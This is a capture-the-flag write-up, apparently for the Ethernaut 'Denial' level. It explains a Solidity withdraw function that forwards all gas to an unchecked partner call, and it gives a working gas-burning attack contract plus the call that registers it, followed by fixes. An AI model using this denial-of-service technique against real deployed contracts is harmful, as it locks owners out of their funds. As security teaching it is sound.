# Level 20: Denial

## Goal

Prevent the owner from withdrawing their funds (denial of service).

## The contract

```solidity
function withdraw() public {
    uint256 amountToSend = address(this).balance / 100;
    // sends with ALL remaining gas, return value ignored
    partner.call{value: amountToSend}("");
    owner.transfer(amountToSend);
    timeLastWithdrawn = block.timestamp;
    withdrawPartnerBalances[partner] += amountToSend;
}
```

## Vulnerability

`withdraw` calls the partner with `partner.call{value: ...}("")`, forwarding **all remaining gas** and **not checking the result**. The owner's `transfer` runs afterward. If the partner is a contract whose fallback consumes all the gas (infinite loop or `assert(false)`), the entire transaction runs out of gas and reverts before the owner is ever paid. The owner can never withdraw.

## Exploit

1. Deploy a malicious partner that burns all gas on receipt:

```solidity
contract DenialAttack {
    receive() external payable {
        while (true) {} // consume all forwarded gas
    }
}
```

2. Register it:

```js
await contract.setWithdrawPartner(denialAttackAddress);
```

Now any call to `withdraw()` exhausts gas at the partner call and reverts, blocking the owner.

## Fix

- **Limit gas** on external calls: `partner.call{value: amount, gas: 2300}("")`, or use the pull pattern so recipients withdraw themselves.
- **Check return values** and follow checks-effects-interactions.
- Do not let an untrusted external call sit before critical logic that must always run.

## Takeaway

Forwarding unlimited gas to an untrusted address, before code that must execute, lets an attacker brick the function by consuming all gas. Bound external-call gas and prefer pull payments.
